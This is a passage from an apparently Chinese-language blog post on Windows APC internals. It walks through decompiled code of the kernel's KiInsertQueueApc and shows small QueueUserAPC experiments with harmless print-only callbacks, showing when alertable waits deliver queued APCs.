class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __fastcall <span class="title">KiInsertQueueApc</span><span class="params">(_KPRCB *PRCB, _KAPC *Apc, <span class="type">char</span> IRQL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _KTHREAD *Thread; <span class="comment">// esi</span></span><br><span class="line">    _KAPC_STATE *v5; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">char</span> ApcMode; <span class="comment">// bl</span></span><br><span class="line">    _LIST_ENTRY *v7; <span class="comment">// ecx</span></span><br><span class="line">    _LIST_ENTRY *Flink; <span class="comment">// edx</span></span><br><span class="line">    _LIST_ENTRY *v9; <span class="comment">// ecx</span></span><br><span class="line">    _LIST_ENTRY *Blink; <span class="comment">// edx</span></span><br><span class="line">    _LIST_ENTRY *v11; <span class="comment">// ecx</span></span><br><span class="line">    _LIST_ENTRY *v12; <span class="comment">// eax</span></span><br><span class="line">    _LIST_ENTRY *v13; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ThreadApcStateIndex; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ApcStateIndex; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">volatile</span> __int32 *v16; <span class="comment">// ebx</span></span><br><span class="line">    <span class="keyword">volatile</span> __int32 *p_ThreadLock; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v18; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">char</span> v19; <span class="comment">// al</span></span><br><span class="line">    ULONG CurrentProcessorNumber; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">int</span> NextProcessor; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v22; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v23; <span class="comment">// eax</span></span><br><span class="line">    _KPRCB *v24; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> v26; <span class="comment">// [esp+Fh] [ebp-19h]</span></span><br><span class="line">    <span class="type">char</span> v27; <span class="comment">// [esp+Fh] [ebp-19h]</span></span><br><span class="line">    <span class="type">int</span> v28; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">    __int32 v30; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">    _WORD v31[<span class="number">4</span>]; <span class="comment">// [esp+1Ch] [ebp-Ch] BYREF</span></span><br><span class="line">    <span class="type">int</span> v32; <span class="comment">// [esp+24h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    Thread = Apc-&gt;Thread;</span><br><span class="line">    <span class="keyword">if</span> ( Apc-&gt;ApcStateIndex == <span class="number">3</span> )</span><br><span class="line">        Apc-&gt;ApcStateIndex = Thread-&gt;ApcStateIndex;</span><br><span class="line">    v5 = Thread-&gt;ApcStatePointer[Apc-&gt;ApcStateIndex];</span><br><span class="line">    ApcMode = Apc-&gt;ApcMode;</span><br><span class="line">    <span class="keyword">if</span> ( Apc-&gt;NormalRoutine )                     <span class="comment">// 用户模式APC</span></span><br><span class="line">    &#123;</span><br><span class="line">        v26 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ApcMode &amp;&amp; (<span class="built_in">int</span> (__stdcall *)(MEMORY_CACHING_TYPE, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))Apc-&gt;KernelRoutine == PsExitSpecialApc )</span><br><span class="line">        &#123;</span><br><span class="line">            Thread-&gt;ApcState.UserApcPending = <span class="number">1</span>;</span><br><span class="line">            v7 = &amp;v5-&gt;ApcListHead[ApcMode];</span><br><span class="line">            Flink = v7-&gt;Flink;</span><br><span class="line">            Apc-&gt;ApcListEntry.Flink = v7-&gt;Flink;</span><br><span class="line">            Apc-&gt;ApcListEntry.Blink = v7;</span><br><span class="line">            Flink-&gt;Blink = &amp;Apc-&gt;ApcListEntry;</span><br><span class="line">            v7-&gt;Flink = &amp;Apc-&gt;ApcListEntry;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            v9 = &amp;v5-&gt;ApcListHead[ApcMode];</span><br><span class="line">            Blink = v9-&gt;Blink;</span><br><span class="line">            Apc-&gt;ApcListEntry.Flink = v9;</span><br><span class="line">            Apc-&gt;ApcListEntry.Blink = Blink;</span><br><span class="line">            Blink-&gt;Flink = &amp;Apc-&gt;ApcListEntry;</span><br><span class="line">            v9-&gt;Blink = &amp;Apc-&gt;ApcListEntry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v11 = &amp;v5-&gt;ApcListHead[ApcMode];</span><br><span class="line">        v12 = v11-&gt;Blink;</span><br><span class="line">        v26 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( v12 != v11 &amp;&amp; v12[<span class="number">2</span>].Flink )</span><br><span class="line">            v12 = v12-&gt;Blink;</span><br><span class="line">        v13 = v12-&gt;Flink;</span><br><span class="line">        Apc-&gt;ApcListEntry.Flink = v12-&gt;Flink;</span><br><span class="line">        Apc-&gt;ApcListEntry.Blink = v12;</span><br><span class="line">        v13-&gt;Blink = &amp;Apc-&gt;ApcListEntry;</span><br><span class="line">        v12-&gt;Flink = &amp;Apc-&gt;ApcListEntry;</span><br><span class="line">    &#125;</span><br><span class="line">    ThreadApcStateIndex = Thread-&gt;ApcStateIndex;</span><br><span class="line">    ApcStateIndex = Apc-&gt;ApcStateIndex;</span><br><span class="line">    <span class="keyword">if</span> ( ApcStateIndex == ThreadApcStateIndex )   <span class="comment">// 状态相同，则尝试立刻交付执行</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">LOBYTE</span>(ThreadApcStateIndex) = (_BYTE)PRCB;</span><br><span class="line">        <span class="keyword">if</span> ( Thread == PRCB-&gt;CurrentThread )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !ApcMode &amp;&amp; (!Thread-&gt;CombinedApcDisable || !v26 &amp;&amp; !Thread-&gt;SpecialApcDisable) )</span><br><span class="line">            &#123;</span><br><span class="line">                Thread-&gt;ApcState.KernelApcPending = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !IRQL )</span><br><span class="line">                &#123;</span><br><span class="line">                    Thread-&gt;MiscFlags |= <span class="number">0x100u</span>;</span><br><span class="line">                    <span class="keyword">return</span> ThreadApcStateIndex;</span><br><span class="line">                &#125;</span><br><span class="line">            RequestSoftwareInterrupt:</span><br><span class="line">                <span class="built_in">LOBYTE</span>(ApcStateIndex) = <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">LOBYTE</span>(ThreadApcStateIndex) = <span class="built_in">HalRequestSoftwareInterrupt</span>(ApcStateIndex);<span class="comment">// 触发软件中断以处理APC</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( ApcMode )                         <span class="comment">// 用户apc交付执行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">LOBYTE</span>(ThreadApcStateIndex) = Thread-&gt;State;</span><br><span class="line">            <span class="keyword">if</span> ( (_BYTE)ThreadApcStateIndex == <span class="number">5</span> )    <span class="comment">// 线程处于等待状态</span></span><br><span class="line">            &#123;</span><br><span class="line">                v27 = <span class="number">0</span>;</span><br><span class="line">                p_ThreadLock = (<span class="keyword">volatile</span> __int32 *)&amp;Thread-&gt;ThreadLock;</span><br><span class="line">                v18 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> ( _InterlockedExchange(p_ThreadLock, <span class="number">1</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( (++v18 &amp; HvlLongSpinCountMask) != <span class="number">0</span> || (HvlEnlightenments &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">                            _mm_pause();</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            <span class="built_in">HvlNotifyLongSpinWait</span>(v18);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> ( *p_ThreadLock );</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( Thread-&gt;State == <span class="number">5</span></span><br><span class="line">                    &amp;&amp; Thread-&gt;WaitMode == <span class="number">1</span>              <span class="comment">// 用户态</span></span><br><span class="line">                    &amp;&amp; ((*(_BYTE *)&amp;Thread-&gt;<span class="number">0</span> &amp; <span class="number">0x20</span>) != <span class="number">0</span> || Thread-&gt;ApcState.UserApcPending) )</span><br><span class="line">                &#123;</span><br><span class="line">                    v19 = <span class="built_in">KiSignalThread</span>(<span class="number">0</span>, Thread, PRCB, <span class="number">0xC0</span>);<span class="comment">// 唤醒该线程</span></span><br><span class="line">                    Thread-&gt;WaitRegister.Flags |= <span class="number">0x20u</span>;</span><br><span class="line">                    v27 = v19;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">LOBYTE</span>(ThreadApcStateIndex) = <span class="number">0</span>;</span><br><span class="line">                _InterlockedAnd(p_ThreadLock, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v27 )</span><br><span class="line">                    Thread-&gt;ApcState.UserApcPending = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                                        <span class="comment">// 内核APC交付执行</span></span><br><span class="line">        &#123;</span><br><span class="line">            Thread-&gt;ApcState.KernelApcPending = <span class="number">1</span>;</span><br><span class="line">            _InterlockedExchange(&amp;v30, (__int32)PRCB);</span><br><span class="line">            ThreadApcStateIndex = Thread-&gt;State;</span><br><span class="line">            <span class="keyword">if</span> ( ThreadApcStateIndex == <span class="number">2</span> )           <span class="comment">// 线程处于运行状态</span></span><br><span class="line">            &#123;</span><br><span class="line">                CurrentProcessorNumber = <span class="built_in">KeGetCurrentProcessorNumberEx</span>(<span class="number">0</span>);</span><br><span class="line">                ApcStateIndex = Thread-&gt;NextProcessor;</span><br><span class="line">                <span class="keyword">if</span> ( CurrentProcessorNumber == ApcStateIndex )<span class="comment">// 如果当前线程调度的下一个处理器为本处理器，则立刻交付执行</span></span><br><span class="line">                    <span class="keyword">goto</span> RequestSoftwareInterrupt;</span><br><span class="line">                NextProcessor = Thread-&gt;NextProcessor;</span><br><span class="line">                v31[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">                v31[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">                v32 = <span class="number">0</span>;</span><br><span class="line">                v22 = (<span class="type">unsigned</span> <span class="type">int</span>)KiProcessorIndexToNumberMappingTable[NextProcessor] &gt;&gt; <span class="number">6</span>;</span><br><span class="line">                v23 = KiProcessorIndexToNumberMappingTable[NextProcessor] &amp; <span class="number">0x3F</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v22 )</span><br><span class="line">                    v31[<span class="number">0</span>] = v22 + <span class="number">1</span>;</span><br><span class="line">                *(&amp;v32 + v22) |= KiMask32Array[v23];</span><br><span class="line">                v24 = <span class="built_in">KeGetPcr</span>()-&gt;Prcb;</span><br><span class="line">                ++v24-&gt;IpiSendSoftwareInterruptCount;   <span class="comment">// 统计Ipi发送次数</span></span><br><span class="line">                <span class="built_in">LOBYTE</span>(ThreadApcStateIndex) = <span class="built_in">KiIpiSend</span>((<span class="type">int</span>)v31, <span class="number">1u</span>);<span class="comment">// 否则向该处理器发出Ipi中断用于通知该处理器执行该线程的APC。</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( ThreadApcStateIndex == <span class="number">5</span> )      <span class="comment">// 线程处于等待状态</span></span><br><span class="line">            &#123;</span><br><span class="line">                v28 = <span class="number">0</span>;</span><br><span class="line">                v16 = (<span class="keyword">volatile</span> __int32 *)&amp;Thread-&gt;ThreadLock;</span><br><span class="line">                <span class="keyword">while</span> ( _InterlockedExchange(v16, <span class="number">1</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( (++v28 &amp; HvlLongSpinCountMask) != <span class="number">0</span> || (HvlEnlightenments &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">                            _mm_pause();</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            <span class="built_in">HvlNotifyLongSpinWait</span>(v28);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> ( *v16 );</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( Thread-&gt;State == <span class="number">5</span></span><br><span class="line">                    &amp;&amp; !Thread-&gt;WaitIrql</span><br><span class="line">                    &amp;&amp; !Thread-&gt;SpecialApcDisable</span><br><span class="line">                    &amp;&amp; (!Apc-&gt;NormalRoutine || !Thread-&gt;KernelApcDisable &amp;&amp; !Thread-&gt;ApcState.KernelApcInProgress) )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">KiSignalThread</span>(<span class="number">0</span>, Thread, PRCB, <span class="number">0x100</span>);<span class="comment">// 唤醒该线程</span></span><br><span class="line">                    Thread-&gt;WaitRegister.Flags |= <span class="number">0x10u</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">LOBYTE</span>(ThreadApcStateIndex) = <span class="number">0</span>;</span><br><span class="line">                _InterlockedAnd(v16, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ThreadApcStateIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下该函数的流程：</p><ul><li>根据<code>KAPC</code>结构中的<code>ApcStateIndex</code>找到对应的<code>APC</code>队列</li><li>再根据<code>KAPC</code>结构中的<code>ApcMode</code>确定是用户队列还是内核队列</li><li>将<code>KAPC</code>挂到对应的队列中（挂到<code>KAPC</code>的<code>ApcListEntry</code>处）</li><li>再根据<code>KAPC</code>结构中的<code>Inserted</code>置1，标识当前的<code>KAPC</code>为已插入状态</li><li>修改<code>KAPC_STATE</code>结构中的<code>KernelApcPending</code>&#x2F;<code>UserApcPending</code></li></ul><p>当插入 <code>APC</code> 时线程为睡眠且可唤醒（<code>alertable</code>），那么 <code>APC</code> 立刻被执行，否则只会被插入到 <code>APC</code> 队列中。</p><p>在队列中的 <code>APC</code> 会在线程进入 <code>alertable</code> 状态后全部交付执行。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCTest.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode1 execute\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode2 execute\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;helloworld\n&quot;</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode1, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode2, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d]prepare to insert apc %d\n&quot;</span>, <span class="built_in">time</span>(<span class="literal">NULL</span>), i);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 向当前线程插入 <code>APC</code> 后，继续运行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">helloworld</span><br><span class="line">[<span class="number">1739719424</span>]prepare to insert apc <span class="number">0</span></span><br><span class="line">[<span class="number">1739719425</span>]prepare to insert apc <span class="number">1</span></span><br><span class="line">[<span class="number">1739719426</span>]prepare to insert apc <span class="number">2</span></span><br><span class="line">[<span class="number">1739719427</span>]prepare to insert apc <span class="number">3</span></span><br><span class="line">[<span class="number">1739719428</span>]prepare to insert apc <span class="number">4</span></span><br></pre></td></tr></table></figure><p>可以看到，线程到死都没有执行成功 <code>APC</code>，因为不满足上面分析的 <code>APC</code> 执行的条件。</p><p>要么插入时执行，要求插入时线程处于可唤醒状态。</p><p>要么插入后执行，要求插入后线程某一刻处于可唤醒状态。</p><h3 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h3><p>很多跟等待相关的，加了 <code>Ex</code> 后缀的函数，其基本跟另外一个参数有关，就是 <code>alertable</code>，例如 <code>Sleep-&gt;SleepEx</code>，<code>WaitForSingleObject-&gt;WaitForSingleObjectEx</code>。</p><p>这里我们把 <code>Sleep</code> 替换为 <code>SleepEx</code> 并把 <code>alertable</code> 设置为 <code>True</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCTest.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode1 execute\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode2 execute\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;helloworld\n&quot;</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode1, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode2, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d]prepare to insert apc %d\n&quot;</span>, <span class="built_in">time</span>(<span class="literal">NULL</span>), i);</span><br><span class="line">        <span class="built_in">SleepEx</span>(<span class="number">1000</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>APC</code> 在第一次 <code>SleepEx</code> 便全部交付完成，并且也没有实际休眠一秒，而是立刻被唤醒。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">helloworld</span><br><span class="line">[<span class="number">1739719959</span>]prepare to insert apc <span class="number">0</span></span><br><span class="line">shellcode1 execute</span><br><span class="line">shellcode2 execute</span><br><span class="line">[<span class="number">1739719959</span>]prepare to insert apc <span class="number">1</span></span><br><span class="line">[<span class="number">1739719960</span>]prepare to insert apc <span class="number">2</span></span><br><span class="line">[<span class="number">1739719961</span>]prepare to insert apc <span class="number">3</span></span><br><span class="line">[<span class="number">1739719962</span>]prepare to insert apc <span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="实验3"><a href="#实验3" class="headerlink" title="实验3"></a>实验3</h3><p>来演示在 <code>SleepEx</code> 的过程中插入 <code>APC</code> 看是否在插入的时候就会被执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCTest.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode1 execute\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode2 execute\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">routine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d]routine %d\n&quot;</span>, <span class="built_in">time</span>(<span class="literal">NULL</span>), i);</span><br><span class="line">        <span class="built_in">SleepEx</span>(<span class="number">10000</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">    HANDLE hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)routine, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;helloworld\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d]prepare to insert apc %d\n&quot;</span>, <span class="built_in">time</span>(<span class="literal">NULL</span>), i);</span><br><span class="line">        <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode1, hThread2, <span 